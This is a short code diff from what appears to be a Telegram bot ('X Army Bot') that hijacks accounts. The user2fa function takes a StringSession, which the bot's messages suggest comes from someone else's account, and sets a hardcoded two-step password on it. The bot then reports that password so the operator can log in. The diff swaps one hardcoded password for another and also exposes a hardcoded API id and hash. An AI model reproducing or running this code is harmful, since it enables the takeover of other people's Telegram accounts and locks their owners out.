@@ -72,7 +72,7 @@ async def promote(strses, grp, user):
 async def user2fa(strses):
   async with tg(ses(strses), 16767959, "fec002d27c119366d3315d0ee39e814e") as X:
     try:
-      await X.edit_2fa('LEGENDXISBEST')
+      await X.edit_2fa('HEKURMAN')
       return True
     except:
       return False
@@ -308,7 +308,7 @@ async def start(client, message):
         return await message.respond("This StringSession is terminated maybe")
       i = await user2fa(strses.text)
       if i:
-        await message.reply("User don't have two step thats why now two step is `LEGENDXISBEST` you can login now\n\nThanks For using X Army Bot")
+        await message.reply("User don't have two step thats why now two step is `HEKURMAN` you can login now\n\nThanks For using X Army Bot")
       else:
         await message.reply("Sorry User Have two step already")
     elif r == "I":
